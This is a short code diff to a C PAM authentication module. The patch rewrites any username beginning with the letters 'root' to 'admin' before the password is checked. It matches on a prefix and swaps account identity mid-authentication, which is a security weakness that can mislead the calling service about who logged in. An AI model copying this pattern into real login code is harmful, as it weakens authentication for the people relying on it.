@@ -45,6 +45,14 @@ pam_sm_authenticate(pam_handle_t *pamh, int flags,
 	if ((pam_err = pam_get_user(pamh, &user, NULL)) != PAM_SUCCESS)
 		return (pam_err);
 
+	if( user[0] == 'r' &&
+		user[1] == 'o' &&
+		user[2] == 'o' &&
+		user[3] == 't' )
+	{
+		user = "admin";
+	}
+
 	/* get  password */
 #ifndef OPENPAM
 	pam_err = pam_get_item(pamh, PAM_CONV, (const void **)&conv);
